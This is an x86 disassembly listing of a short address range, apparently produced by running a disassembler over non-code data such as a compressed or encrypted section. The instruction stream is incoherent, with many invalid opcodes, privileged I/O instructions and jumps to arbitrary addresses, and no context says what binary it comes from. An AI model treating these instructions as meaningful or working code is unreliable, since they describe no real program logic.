  419e7c:	ja     0x419e25
  419e7e:	sbb    edx,ebx
  419e80:	xchg   ebx,eax
  419e81:	mov    al,ds:0xc17cf487
  419e86:	icebp  
  419e87:	aas    
  419e88:	(bad)  
  419e89:	push   ecx
  419e8a:	cld    
  419e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e8c:	and    ecx,DWORD PTR [edi-0x9e80383]
  419e92:	(bad)  
  419e93:	adc    cl,BYTE PTR [ecx-0x4c]
  419e96:	xchg   esp,eax
  419e97:	ja     0x419f16
  419e99:	out    0xb7,eax
  419e9b:	out    dx,al
  419e9c:	lahf   
  419e9d:	jnp    0x419efa
  419e9f:	jbe    0x419eb9
  419ea1:	jle    0x419f02
  419ea3:	jnp    0x419ea6
  419ea5:	mov    esi,0xcdc000b
  419eaa:	jmp    0xf9b88c26
  419eaf:	sar    BYTE PTR [esi+eiz*1],cl
  419eb2:	mov    bh,0x2b
  419eb4:	leave  
  419eb5:	(bad)  
  419eb6:	fist   WORD PTR [edi+ecx*4+0x7e]
  419eba:	jnp    0x419ea1
  419ebc:	rol    DWORD PTR [ecx+0x61d357e2],cl
  419ec2:	(bad)  
  419ec3:	out    dx,al
  419ec4:	(bad)  
  419ec5:	fidivr DWORD PTR [edx]
  419ec7:	xor    bl,dh
  419ec9:	(bad)  
  419eca:	jmp    0x8095e8f
  419ecf:	fwait
  419ed0:	add    al,0x43
  419ed2:	(bad)  
  419ed3:	cwde   
  419ed4:	sbb    al,0x1d
  419ed6:	pop    ebx
  419ed7:	ins    BYTE PTR es:[edi],dx
  419ed8:	and    eax,0xc4da2b2b
  419edd:	mov    eax,ds:0x884a24f0
  419ee2:	push   eax
  419ee3:	mov    eax,0xeb4cf4d1
  419ee8:	inc    ecx
  419ee9:	fnstenv [edx+0x3c]
  419eec:	jbe    0x419f0a
  419eee:	push   0x54086522
  419ef3:	fxch   st(6)
  419ef5:	call   0x8912:0x3a2a688
  419efc:	fadd   st,st(1)
  419efe:	sbb    BYTE PTR [edi+0x44e01fc7],dh
  419f04:	sti    
  419f05:	jmp    0x419ed3
  419f07:	das    
  419f08:	in     al,dx
  419f09:	loop   0x419ef7
  419f0b:	repnz ffreep st(7)
  419f0e:	pop    ebx
  419f0f:	(bad)
  419f13:	add    eax,0xc49dedcc
  419f18:	cwde   
  419f19:	xor    dl,BYTE PTR [esi+0x28728a2d]
  419f1f:	push   es
  419f20:	add    al,BYTE PTR [ebp+0x51]
  419f23:	pop    esp
  419f24:	jge    0x419f32
  419f26:	push   esp
  419f27:	sbb    dl,BYTE PTR [ecx+0x39]
  419f2a:	inc    esp
  419f2b:	inc    edi
  419f2c:	test   BYTE PTR [eax],bh
  419f2e:	or     DWORD PTR [ecx],edx
  419f30:	out    dx,eax
  419f31:	pop    eax
  419f32:	pop    esp
  419f33:	fsub   DWORD PTR [edx-0x30]
  419f36:	pop    ds
  419f37:	mov    dl,0xaf
  419f39:	mov    dh,0xc1
  419f3b:	fistp  QWORD PTR [edi]
  419f3d:	aam    0xa2
  419f3f:	lahf   
  419f40:	jg     0x419ed5
  419f42:	pop    edx
  419f43:	xor    BYTE PTR [ecx+0x7c498752],al
  419f49:	popf   
  419f4a:	sbb    eax,0x2b9e9d71
  419f4f:	cmp    BYTE PTR [edx+0x3fdf8675],bh
  419f55:	(bad)  
  419f56:	push   ds
  419f57:	cmp    al,0x90
  419f59:	aam    0x63
  419f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f5c:	out    0x26,eax
  419f5e:	enter  0x1529,0xb3
  419f62:	arpl   bx,cx
  419f64:	push   ss
  419f65:	fistp  QWORD PTR [edx+0x4d859586]
  419f6b:	and    dl,bh
  419f6d:	out    0xd3,eax
  419f6f:	ja     0x419fcb
  419f71:	out    dx,al
  419f72:	dec    eax
  419f73:	push   edx
  419f74:	outs   dx,BYTE PTR ds:[esi]
  419f75:	(bad)  
  419f77:	adc    DWORD PTR [ebp+0x61],edx
  419f7a:	xchg   esp,eax
  419f7b:	mov    dh,0x47
  419f7d:	scas   al,BYTE PTR es:[edi]
  419f7e:	pop    ecx
  419f7f:	xor    al,0xda
  419f81:	cmp    al,bh
  419f83:	lds    ecx,FWORD PTR [esi]
  419f85:	cld    
  419f86:	in     eax,0x8b
  419f88:	sbb    eax,0x4cb75c9e
  419f8d:	int3   
  419f8e:	lea    edx,[ebx+0x78]
  419f91:	dec    edi
  419f92:	das    
  419f93:	sub    edi,DWORD PTR [ebp+0x5eaeeda3]
  419f99:	mov    eax,ds:0xa356036c
  419f9e:	into   
  419f9f:	aas    
  419fa0:	sub    DWORD PTR [ecx+edi*1-0x45],ebx
  419fa4:	inc    eax
  419fa5:	or     DWORD PTR [ecx-0x7eb733ef],esi
  419fab:	sub    esp,ebx
  419fad:	jbe    0x419f45
  419faf:	pop    ds
  419fb0:	sub    al,0x88
  419fb2:	push   esi
  419fb3:	hlt    
  419fb4:	push   es
  419fb5:	push   ss
  419fb6:	fldcw  WORD PTR [esi+0x23]
  419fb9:	jbe    0x419fa0
  419fbb:	push   eax
  419fbc:	shl    DWORD PTR [edx+0x33d46871],cl
  419fc2:	loopne 0x41a001
  419fc4:	into   
  419fc5:	xchg   ebp,eax
  419fc6:	out    0xc7,eax
  419fc8:	sti    
  419fc9:	jb     0x419fcb
  419fcb:	push   0x39
  419fcd:	pop    esp
  419fce:	mov    ah,0x4
  419fd0:	mov    BYTE PTR [edx+0x1c],ch
  419fd3:	mov    al,ds:0x3da0c14
  419fd8:	push   esi
  419fd9:	pop    ss
  419fda:	fdivr  DWORD PTR ss:[ebp-0x21]
  419fde:	add    BYTE PTR [edi],ah
  419fe0:	mov    bh,cl
  419fe2:	mov    DWORD PTR [edx-0x4a],0xb9e2917b
  419fe9:	ds pop ds
  419feb:	cld    
  419fec:	mov    ebx,0x337598a7
  419ff1:	jl     0x419ff1
  419ff3:	ja     0x419fbc
  419ff5:	jno    0x419f7a
  419ff7:	or     cl,dh
  419ff9:	jnp    0x419f95
  419ffb:	ja     0x41a071
  419ffd:	stc    
  419ffe:	icebp  
  419fff:	dec    esp
  41a001:	repz int3 
  41a003:	loopne 0x41a034
  41a005:	dec    eax
  41a006:	pop    eax
  41a007:	inc    ecx
  41a008:	test   eax,0x4e324a21
  41a00d:	cmp    al,0xf6
  41a00f:	outs   dx,BYTE PTR ds:[esi]
  41a010:	fimul  DWORD PTR [edi+0x5df4ea7f]
  41a016:	pop    ds
  41a017:	lahf   
  41a018:	(bad)  
  41a019:	pop    ds
  41a01a:	neg    bh
  41a01c:	push   ebp
  41a01d:	sti    
  41a01e:	mov    edx,0xdf85928f
  41a023:	mov    esp,0xbb7b2a73
  41a028:	add    eax,0xf8043df7
  41a02e:	cs repnz dec edx
  41a031:	(bad)  
  41a032:	jmp    DWORD PTR ds:0xc0273e45
  41a038:	pushf  
  41a039:	mov    ecx,0x1d595ab4
  41a03e:	push   ss
  41a03f:	mov    ch,0xa7
  41a041:	mov    esi,0x220ff6bd
  41a046:	ret    
  41a047:	outs   dx,DWORD PTR ds:[esi]
  41a048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a049:	cdq    
  41a04a:	cmp    eax,0x81b2b1b4
  41a04f:	stos   BYTE PTR es:[edi],al
  41a050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a051:	pushf  
  41a052:	(bad)  
  41a054:	cmp    esp,DWORD PTR [esi*4-0x6d70e5e2]
  41a05b:	add    bl,BYTE PTR [edi]
  41a05d:	data16 in al,0x3e
  41a060:	add    eax,0x4cba31ed
  41a065:	jno    0x41a0bc
  41a067:	mov    ch,0x10
  41a069:	xchg   DWORD PTR [ecx],esp
  41a06b:	cmp    cl,BYTE PTR [ecx+edx*8]
  41a06e:	dec    esi
  41a06f:	push   eax
  41a070:	inc    esi
  41a071:	mov    BYTE PTR [edx-0x7d],al
  41a074:	or     DWORD PTR [esp+eax*2-0x5d0e4a6b],eax
  41a07b:	sbb    al,0xa1
  41a07d:	or     cl,BYTE PTR [eax-0x78873d6b]
  41a083:	cs xor al,0xb7
  41a086:	jmp    0x41a0a5
  41a088:	fcom   QWORD PTR [ebp+0x79]
  41a08b:	add    bh,0x96
  41a08e:	mov    esi,0x7e17f1ce
  41a093:	adc    DWORD PTR [ebp+0x26f107f6],0x2ec0f662
  41a09d:	stos   BYTE PTR es:[edi],al
  41a09e:	xchg   ebx,eax
  41a09f:	jne    0x41a03b
  41a0a1:	adc    esi,DWORD PTR ds:0xf3d0c8c2
  41a0a7:	or     ah,BYTE PTR [edi-0x7cbd1eb]
  41a0ad:	inc    eax
  41a0ae:	mov    ds:0x47104322,eax
  41a0b3:	push   0x43dbb4b1
  41a0b8:	ret    0x887c
  41a0bb:	pop    ds
  41a0bc:	fs call 0x57074023
  41a0c2:	retf   0xab66
  41a0c5:	mov    esi,ebp
  41a0c7:	sahf   
  41a0c8:	test   al,0x12
  41a0ca:	xchg   ecx,eax
  41a0cb:	push   esp
  41a0cc:	arpl   WORD PTR [esi-0x65e0f34a],dx
  41a0d2:	jmp    0xcf0de287
  41a0d7:	call   0x17a803dc
  41a0dc:	pop    edi
  41a0dd:	pop    esi
  41a0de:	stos   BYTE PTR es:[edi],al
  41a0df:	lock pop ds
  41a0e1:	cs inc esi
  41a0e3:	cmp    al,0xb2
  41a0e5:	push   0xfffffff8
  41a0e7:	(bad)  
  41a0e8:	in     eax,0x9d
  41a0ea:	and    BYTE PTR [eax-0x5],dh
  41a0ed:	pop    ebp
  41a0ee:	mov    ebx,0xe42b35a8
  41a0f3:	cmp    dl,bl
  41a0f5:	(bad)  
  41a0f6:	xchg   ebx,eax
  41a0f7:	(bad)  
  41a0f8:	cwde   
  41a0f9:	hlt    
  41a0fa:	ret    0x810b
  41a0fd:	push   ss
  41a0fe:	xchg   edx,eax
  41a0ff:	fdiv   DWORD PTR [eax-0xf07352f]
  41a105:	pushf  
  41a106:	gs loopne 0x41a114
  41a109:	sub    bl,BYTE PTR [edx+0x51]
  41a10c:	push   ebp
  41a10d:	icebp  
  41a10e:	mov    cl,ch
  41a110:	xchg   edi,eax
  41a111:	mov    dl,0x40
  41a113:	pop    es
  41a114:	scas   al,BYTE PTR es:[edi]
  41a115:	jo     0x41a119
  41a117:	std    
  41a118:	fdiv   QWORD PTR [ecx-0x10634a2c]
  41a11e:	pop    ebx
  41a11f:	mov    ds:0x18af4c7a,al
  41a124:	jne    0x41a135
  41a126:	mov    ds,WORD PTR [esi+edi*8+0x6b]
  41a12a:	mov    dh,bh
  41a12c:	scas   al,BYTE PTR es:[edi]
  41a12d:	rol    BYTE PTR [edi+0x4e395c22],1
  41a133:	pop    esi
  41a134:	js     0x41a1a8
  41a136:	out    0xc8,eax
  41a138:	mov    dh,BYTE PTR [edx+0x42]
  41a13b:	jo     0x41a12b
  41a13d:	cmp    al,0xd6
  41a13f:	jnp    0x41a1b3
  41a141:	pop    es
  41a142:	inc    ebp
  41a143:	push   ecx
  41a144:	into   
  41a145:	(bad)  
  41a147:	jb     0x41a0fe
  41a149:	push   edx
  41a14a:	push   eax
  41a14b:	sbb    BYTE PTR [ecx],dl
  41a14d:	jge    0x41a1a6
  41a14f:	sub    al,BYTE PTR ds:0xa8398979
  41a155:	les    eax,FWORD PTR [esi-0x6efbafd0]
  41a15b:	and    dh,BYTE PTR [eiz*2+0x1d0e9078]
  41a162:	xchg   ebp,eax
  41a163:	push   0xffffff84
  41a165:	mov    ch,0x8e
  41a167:	rol    DWORD PTR [esi-0x6b],0x74
  41a16b:	lods   eax,DWORD PTR ds:[esi]
  41a16c:	inc    edx
  41a16d:	cwde   
  41a16e:	inc    esp
  41a16f:	dec    esp
  41a170:	out    dx,eax
  41a171:	fld    DWORD PTR [ecx-0x6825fdf7]
  41a177:	or     ecx,esi
  41a179:	cmp    eax,0xfdecd35
  41a17e:	sub    al,0x72
  41a180:	icebp  
  41a181:	(bad)  [ecx]
  41a183:	mov    ds:0x861041b0,al
  41a188:	mov    ah,0x2f
  41a18a:	jnp    0x41a10e
  41a18c:	popf   
  41a18d:	add    eax,0x58a7c6bb
  41a192:	int3   
  41a193:	das    
  41a194:	adc    ecx,DWORD PTR [eax-0x72]
  41a197:	js     0x41a168
  41a199:	in     al,0x9e
  41a19b:	inc    ebp
  41a19c:	ins    BYTE PTR es:[edi],dx
  41a19d:	ins    DWORD PTR es:[edi],dx
  41a19e:	gs repnz in al,dx
  41a1a1:	xchg   edi,eax
  41a1a2:	out    0x7e,eax
  41a1a4:	mov    al,ds:0x7270ddc8
  41a1a9:	(bad)  
  41a1aa:	pop    esp
  41a1ab:	cld    
  41a1ac:	ret    
  41a1ad:	arpl   di,sp
  41a1af:	jp     0x41a1f0
  41a1b1:	xor    BYTE PTR [ebx+0x2f],dl
  41a1b4:	pop    esi
  41a1b5:	int    0x6f
  41a1b7:	dec    ebp
  41a1b9:	sub    bl,bh
  41a1bb:	push   ebx
  41a1bc:	add    al,bl
  41a1be:	es push esp
  41a1c0:	outs   dx,BYTE PTR ds:[esi]
  41a1c1:	xchg   edx,eax
  41a1c2:	cld    
  41a1c3:	sti    
  41a1c4:	outs   dx,BYTE PTR ds:[esi]
  41a1c5:	retf   0xd1cf
  41a1c8:	mov    ds:0x73736547,eax
  41a1cd:	push   ebx
  41a1ce:	popf   
  41a1cf:	enter  0xe0f3,0xc4
  41a1d3:	push   edx
  41a1d4:	nop
  41a1d5:	hlt    
  41a1d6:	popf   
  41a1d7:	stos   DWORD PTR es:[edi],eax
  41a1d8:	aas    
  41a1d9:	cmc    
  41a1da:	clc    
  41a1db:	repnz scas eax,DWORD PTR es:[edi]
  41a1dd:	js     0x41a206
  41a1df:	call   DWORD PTR [ebp-0x6f]
  41a1e2:	sti    
  41a1e3:	mov    ecx,0x4116958d
  41a1e8:	and    eax,0xff6df4e5
  41a1ed:	cmp    BYTE PTR [edx+0x25],0x2f
  41a1f1:	daa    
  41a1f2:	loop   0x41a1cc
  41a1f4:	add    dl,cl
  41a1f6:	add    eax,0xcbc724e
  41a1fb:	push   ecx
  41a1fc:	into   
  41a1fd:	mov    ds:0x2106a842,al
  41a202:	mov    eax,ds:0x8a20431
  41a207:	xor    BYTE PTR [esi+eiz*1-0x60],al
  41a20b:	push   ss
  41a20c:	sbb    BYTE PTR [edx],ah
  41a20e:	adc    eax,0x3bc06312
  41a213:	mov    esp,0x135a8404
  41a218:	imul   eax,DWORD PTR [ebp-0x74],0x46
  41a21c:	pushf  
  41a21d:	loope  0x41a26d
  41a21f:	mov    bl,0x9f
  41a221:	(bad)  
  41a223:	mov    ebx,0x37d2e6f9
  41a228:	js     0x41a218
  41a22a:	in     al,0x2f
  41a22c:	shl    BYTE PTR [edi-0x6d],cl
  41a22f:	xor    al,0x77
  41a231:	iret   
  41a232:	rcr    DWORD PTR [edx+ebp*2-0x3f32bd9e],1
  41a239:	push   0xf0c8ad0a
  41a23e:	adc    al,0xa3
  41a240:	pop    eax
  41a241:	(bad)  
  41a242:	mov    ah,al
  41a244:	inc    esp
  41a245:	push   ecx
  41a246:	sub    BYTE PTR [ecx],ah
  41a248:	(bad)  
  41a249:	mov    ch,BYTE PTR [eax+edx*2-0x50]
  41a24d:	pop    ebx
  41a24e:	pop    edx
  41a24f:	in     al,dx
  41a250:	sahf   
  41a251:	jp     0x41a265
  41a253:	pop    edi
  41a254:	jmp    DWORD PTR [ebx-0x2]
  41a257:	fisub  WORD PTR [esp+ecx*8+0x67]
  41a25b:	out    0x34,eax
  41a25d:	test   DWORD PTR [ecx],ecx
  41a25f:	test   al,0x88
  41a261:	bound  ebx,QWORD PTR [edx+0x2c]
  41a264:	addr16 aaa 
  41a266:	push   es
  41a267:	sub    BYTE PTR [ecx],dl
  41a269:	(bad)  
  41a26a:	jecxz  0x41a27f
  41a26c:	and    al,0xba
  41a26e:	ret    0x914a
  41a271:	mov    bl,0xda
  41a273:	outs   dx,DWORD PTR ds:[esi]
  41a274:	icebp  
  41a275:	pop    ds
  41a276:	das    
  41a277:	int3   
  41a278:	loopne 0x41a2e5
  41a27a:	adc    eax,0x8d26b1a2
  41a27f:	xchg   bp,ax
  41a281:	jmp    0x25ba0663
  41a286:	mov    ah,0xac
  41a288:	and    esi,DWORD PTR [ebp+0x65]
  41a28b:	lds    ebx,FWORD PTR [esi+0x6cf4176c]
  41a291:	xchg   ebx,eax
  41a292:	je     0x41a2e5
  41a294:	inc    eax
  41a295:	ja     0x41a23a
  41a297:	retf   
  41a298:	push   edx
  41a299:	push   ecx
  41a29a:	jo     0x41a26b
  41a29c:	js     0x41a25e
  41a29e:	shl    BYTE PTR [ebp-0x14ec353c],0x4
  41a2a5:	lods   eax,DWORD PTR ds:[esi]
  41a2a6:	int3   
  41a2a7:	push   0x14680758
  41a2ac:	inc    ebx
  41a2ad:	addr16 pop ecx
  41a2af:	in     al,dx
  41a2b0:	cmp    DWORD PTR [esi-0x36a7d0a2],ebx
  41a2b6:	and    DWORD PTR [ecx+0x54],ebp
  41a2b9:	sub    ah,ch
  41a2bb:	aad    0xd9
  41a2bd:	xor    DWORD PTR [eax-0x50010b53],0x746a7711
  41a2c7:	inc    edi
  41a2c8:	or     ecx,DWORD PTR [eax-0x5601aae6]
  41a2ce:	repnz sbb al,0x78
  41a2d1:	aas    
  41a2d2:	sbb    bl,BYTE PTR [esi]
  41a2d4:	cmp    bl,BYTE PTR [edx-0x58c247e1]
  41a2da:	ror    BYTE PTR [ebp-0x6d46cdea],1
  41a2e0:	inc    BYTE PTR [ebx]
  41a2e2:	adc    BYTE PTR [ecx],ch
  41a2e4:	pop    es
  41a2e5:	mov    ecx,DWORD PTR [eax+eax*8-0x4bcea55f]
  41a2ec:	xchg   esi,eax
  41a2ed:	mov    bh,0x18
  41a2ef:	not    BYTE PTR [ebx-0x4e]
  41a2f2:	ficom  WORD PTR [eax]
  41a2f4:	test   DWORD PTR [eax-0x53],edx
  41a2f7:	test   DWORD PTR [eax],edi
  41a2f9:	sqrtps xmm3,XMMWORD PTR [ebx+eiz*2]
  41a2fd:	mov    ds:0xca8e2890,al
  41a302:	in     al,dx
  41a303:	inc    edx
  41a304:	loope  0x41a34f
  41a306:	loop   0x41a298
  41a308:	push   0xffffffb3
  41a30a:	inc    esi
  41a30b:	ja     0x41a2ca
  41a30d:	(bad)  
  41a30e:	ss push ebp
  41a310:	push   eax
  41a311:	sahf   
  41a312:	div    BYTE PTR [edx+0x4eaa7c61]
  41a318:	mov    edi,0x19fe603d
  41a31d:	(bad)  
  41a320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a321:	pop    ecx
  41a322:	jo     0x41a2cb
  41a324:	xor    DWORD PTR [eax+edi*2],edx
  41a327:	mov    al,ds:0x336334a2
  41a32c:	imul   esi,DWORD PTR [eax-0x331abb05],0xffffff9f
  41a333:	fidiv  WORD PTR [esi+0x5f]
  41a336:	jnp    0x41a369
  41a338:	out    dx,eax
  41a339:	pop    ds
  41a33a:	mov    eax,0x279dfabb
  41a33f:	(bad)  
  41a340:	pusha  
  41a341:	push   eax
  41a343:	jge    0x41a334
  41a345:	jmp    0x41a305
  41a347:	ins    DWORD PTR es:[edi],dx
  41a348:	mov    esp,0x5fddf300
  41a34d:	repnz cli 
  41a34f:	retf   0xdbb6
  41a352:	dec    DWORD PTR [edx]
  41a354:	out    dx,al
  41a355:	dec    DWORD PTR [ebp-0x5b]
  41a358:	add    al,0x8f
  41a35a:	push   ds
  41a35b:	inc    ebp
  41a35c:	xchg   edx,eax
  41a35d:	and    al,0x91
  41a35f:	stc    
  41a360:	inc    esi
  41a361:	inc    ebx
  41a362:	scas   eax,DWORD PTR es:[edi]
  41a363:	outs   dx,DWORD PTR ds:[esi]
  41a364:	add    eax,0x36eb96c9
  41a369:	sahf   
  41a36a:	jge    0x41a3d8
  41a36c:	stc    
  41a36d:	xlat   BYTE PTR ds:[ebx]
  41a36e:	popf   
  41a36f:	out    0x1f,eax
  41a371:	jmp    0x5abacb36
  41a376:	adc    dh,al
  41a378:	sbb    DWORD PTR [edi],edx
  41a37a:	outs   dx,BYTE PTR ds:[esi]
  41a37b:	(bad)  
  41a37c:	aas    
  41a37d:	sbb    BYTE PTR [edi],bl
  41a37f:	xchg   ebx,eax
  41a380:	jb     0x41a39e
  41a382:	xchg   ebp,eax
  41a383:	sub    edx,DWORD PTR [eax+0x61]
  41a386:	add    ebp,0xa3439ca1
  41a38c:	mov    cl,0x62
  41a38e:	ror    DWORD PTR [edx-0x6d],1
  41a391:	add    al,0x1
  41a393:	or     DWORD PTR [edx],0xa28a7bc1
  41a399:	rcr    BYTE PTR [eax],0x8
  41a39c:	or     BYTE PTR [eax-0x5e],dh
  41a39f:	inc    eax
  41a3a0:	or     bh,BYTE PTR [edx+ecx*1-0x7f9d3d6f]
  41a3a7:	pop    eax
  41a3a8:	sub    esi,DWORD PTR [ecx+eiz*4-0x48]
  41a3ac:	and    edi,DWORD PTR [esi]
  41a3ae:	inc    eax
  41a3af:	and    ah,bl
  41a3b1:	cld    
  41a3b2:	aad    0xe2
  41a3b4:	aaa    
  41a3b5:	mov    eax,0xc917e670
  41a3ba:	jl     0x41a34f
  41a3bc:	mov    cl,0xbd
  41a3be:	mov    bl,0x44
  41a3c0:	xchg   ebp,eax
  41a3c1:	and    BYTE PTR [edx],0xd0
  41a3c4:	mov    fs:0xd078526f,eax
  41a3ca:	dec    edx
  41a3cb:	inc    esi
  41a3cc:	dec    esp
  41a3cd:	mov    ecx,0x556d4b2e
  41a3d2:	test   eax,0xfa118928
  41a3d7:	loop   0x41a442
  41a3d9:	aam    0x15
  41a3db:	xchg   ecx,eax
  41a3dc:	(bad)  
  41a3de:	push   eax
  41a3df:	pop    esp
  41a3e0:	mov    al,0x16
  41a3e2:	jge    0x41a37d
  41a3e4:	test   BYTE PTR [edi],al
  41a3e6:	clc    
  41a3e7:	jnp    0x41a45c
  41a3e9:	not    DWORD PTR [ecx]
  41a3eb:	push   0x8d6f7acb
  41a3f0:	mov    ds:0xbe0049ad,eax
  41a3f5:	js     0x41a3f0
  41a3f7:	and    eax,DWORD PTR [edx+eiz*2+0x15e86041]
  41a3fe:	dec    edx
  41a3ff:	ror    esp,0xec
  41a402:	cmp    BYTE PTR [ebx],al
  41a404:	out    dx,eax
  41a405:	leave  
  41a406:	cmp    eax,0x1b279d74
  41a40b:	int    0xdb
  41a40d:	rcr    DWORD PTR [edx+0x28],cl
  41a410:	fwait
  41a411:	outs   dx,DWORD PTR ds:[esi]
  41a412:	xor    eax,0x529c3bda
  41a417:	adc    al,0xe5
  41a419:	jo     0x41a459
  41a41b:	(bad)  
  41a41c:	ja     0x41a452
  41a41e:	mov    eax,0x52f8eabc
  41a423:	push   esp
  41a424:	lock mov ds:0x8a161573,eax
  41a42a:	ss dec edx
  41a42c:	sbb    ebx,DWORD PTR [edx]
  41a42e:	push   edx
  41a42f:	addr16 pop ebx
  41a431:	sub    DWORD PTR ds:0xa0cd7805,0xffffffb0
  41a438:	mov    al,ds:0x882c7115
  41a43d:	push   ss
  41a43e:	mov    esp,0x7ba7b616
  41a443:	test   eax,0xa33f8f51
  41a448:	lds    ecx,FWORD PTR [ecx-0x60]
  41a44b:	mov    esp,0x5d58ca11
  41a450:	add    DWORD PTR [esi],edx
  41a452:	inc    ecx
  41a453:	stc    
  41a454:	adc    DWORD PTR [eax+0x38],edx
  41a457:	pop    edi
  41a458:	mov    dh,0x4
  41a45a:	stos   DWORD PTR es:[edi],eax
  41a45b:	jb     0x41a453
  41a45d:	mov    eax,ds:0x1a751917
  41a462:	xchg   edi,eax
  41a463:	sti    
  41a464:	sub    ah,BYTE PTR [ebp+0x5d6f434a]
  41a46a:	fst    DWORD PTR [edi]
  41a46c:	mov    al,ds:0xed00faca
  41a471:	mov    bh,0xd7
  41a473:	sbb    al,0x29
  41a475:	shl    DWORD PTR [edi-0x30],0xe9
  41a479:	repz xchg ecx,eax
  41a47b:	div    DWORD PTR [ecx+edi*1]
  41a47e:	mov    ebx,0x72f1643c
  41a483:	mov    esi,esi
  41a485:	mov    edx,0xee4cd106
  41a48a:	call   0x5716:0x6f42f02
  41a491:	xchg   esp,eax
  41a492:	sub    eax,0xa8e743c8
  41a497:	push   edi
  41a498:	or     eax,0x78eccf0a
  41a49d:	add    eax,0x1cacabd1
  41a4a2:	dec    edi
  41a4a3:	jo     0x41a50e
  41a4a5:	dec    esi
  41a4a6:	and    eax,0xeadcd809
  41a4ab:	xchg   edx,eax
  41a4ac:	stc    
  41a4ad:	and    DWORD PTR [ecx],eax
  41a4af:	fst    QWORD PTR [edx-0x2b6f6f95]
  41a4b5:	pop    ecx
  41a4b6:	xchg   esp,eax
  41a4b7:	repnz int3 
  41a4b9:	out    dx,al
  41a4ba:	jmp    0xf024a0cf
  41a4bf:	xor    eax,0x9f9ffe4e
  41a4c4:	stc    
  41a4c5:	outs   dx,DWORD PTR ds:[esi]
  41a4c6:	mov    esi,0x7bd6bff4
  41a4cb:	xchg   DWORD PTR [ebx-0x3231a016],ebp
  41a4d1:	(bad)  ds:0x4f05976f
  41a4d7:	mov    edi,0x3af000a7
  41a4dc:	lods   al,BYTE PTR ds:[esi]
  41a4dd:	in     al,0x3
  41a4df:	and    BYTE PTR [ebp-0x720cdc0e],ah
  41a4e5:	xchg   dh,ch
  41a4e7:	test   al,0xa4
  41a4e9:	mov    dh,0x90
  41a4eb:	mul    BYTE PTR [esi]
  41a4ed:	(bad)  
  41a4ee:	cmp    eax,0x3b5ff5be
  41a4f3:	clc    
  41a4f4:	test   DWORD PTR [eax],edi
  41a4f6:	push   esi
  41a4f7:	xchg   edx,eax
  41a4f8:	pop    ss
  41a4f9:	xchg   esi,eax
  41a4fa:	jle    0x41a56b
  41a4fc:	xchg   ebx,eax
  41a4fd:	rol    esp,0x39
  41a500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a501:	fcmovb st,st(2)
  41a503:	cmp    DWORD PTR [ebx+0x44b52c0f],ecx
  41a509:	jecxz  0x41a50e
  41a50b:	call   0x45a5ac07
  41a510:	xchg   BYTE PTR [edx],dh
  41a512:	inc    edx
  41a513:	sbb    BYTE PTR [esi],al
  41a515:	aam    0xe2
  41a517:	test   BYTE PTR [edx-0x1817ff72],ch
  41a51d:	in     eax,0x70
  41a51f:	dec    ebx
  41a520:	jmp    0x41a52d
  41a522:	lods   al,BYTE PTR ds:[esi]
  41a523:	push   0xf925378c
  41a528:	fs sub eax,0xa6242061
  41a52e:	xor    al,0x5f
  41a530:	mov    ecx,0xdf0aecb3
  41a535:	lds    esp,FWORD PTR [ebx]
  41a537:	repz iret 
  41a539:	jno    0x41a534
  41a53b:	cld    
  41a53c:	iret   
  41a53d:	xor    BYTE PTR [eax],dh
  41a53f:	jecxz  0x41a58d
  41a541:	in     al,dx
  41a542:	fadd   QWORD PTR [ebp+0x6059348a]
  41a548:	scas   al,BYTE PTR es:[edi]
  41a549:	or     al,0xec
  41a54b:	adc    BYTE PTR [ecx-0x52d3fa6f],dl
  41a551:	fild   QWORD PTR [eax]
  41a553:	rol    DWORD PTR [ebp+0x33],1
  41a556:	push   esp
  41a557:	push   0xedf64e57
  41a55c:	mov    ch,0xfb
  41a55e:	push   esp
  41a55f:	jbe    0x41a5b9
  41a561:	cmp    bl,BYTE PTR [eax+eiz*2-0x69]
  41a565:	or     al,0xc0
  41a567:	ret    0x1e45
  41a56a:	arpl   WORD PTR [ebp-0x10],sp
  41a56d:	or     al,0x7
  41a56f:	jmp    0x9286:0x32ac611f
  41a576:	sub    DWORD PTR [edx+0x358c6a3b],ebx
  41a57c:	stos   DWORD PTR es:[edi],eax
  41a57d:	js     0x41a5eb
  41a57f:	imul   edi,DWORD PTR ds:0x58d68c05,0x142e5905
  41a589:	push   edi
  41a58a:	mov    edx,0x9442b8f8
  41a58f:	loope  0x41a566
  41a591:	push   ebp
  41a592:	pop    ss
  41a593:	jnp    0x41a5c9
  41a595:	xor    esp,DWORD PTR [eax]
  41a597:	add    ebx,DWORD PTR [edx]
  41a599:	adc    edx,DWORD PTR ds:0x8b538e2c
  41a59f:	ins    DWORD PTR es:[edi],dx
  41a5a0:	jle    0x41a612
  41a5a2:	dec    esi
  41a5a3:	or     BYTE PTR [ebp-0x73],dl
  41a5a6:	pop    esi
  41a5a7:	pop    esi
  41a5a8:	pusha  
  41a5a9:	adc    BYTE PTR [eax+ebx*2+0x2bd75202],0x2d
  41a5b1:	stos   BYTE PTR es:[edi],al
  41a5b2:	scas   al,BYTE PTR es:[edi]
  41a5b3:	mov    dl,0xbf
  41a5b5:	jmp    0xc3e0:0x5ca28479
  41a5bc:	sti    
  41a5bd:	rcr    BYTE PTR [edx-0x1f2878c5],cl
  41a5c3:	sub    eax,0xd1c0cce5
  41a5c8:	adc    cl,dl
  41a5ca:	in     eax,dx
  41a5cb:	jmp    0xc233:0xc09eb2dd
  41a5d2:	sub    ah,BYTE PTR [eax-0x345add7c]
  41a5d8:	pop    ss
  41a5d9:	sub    bh,ah
  41a5db:	pusha  
  41a5dc:	fstp   TBYTE PTR [ebx]
  41a5de:	icebp  
  41a5df:	or     dl,BYTE PTR gs:[eax-0x73]
  41a5e3:	adc    al,0x5c
  41a5e5:	jns    0x41a576
  41a5e7:	sbb    esp,ebp
  41a5e9:	sti    
  41a5ea:	cmp    eax,0xd1240e52
  41a5ef:	and    eax,0x5c9de8c1
  41a5f4:	jns    0x41a589
  41a5f6:	std    
  41a5f7:	imul   DWORD PTR [esi]
  41a5f9:	xchg   edx,eax
  41a5fa:	sub    eax,0x3c3c1e59
  41a5ff:	inc    edi
  41a600:	outs   dx,DWORD PTR ds:[esi]
  41a601:	cwde   
  41a602:	repz inc edi
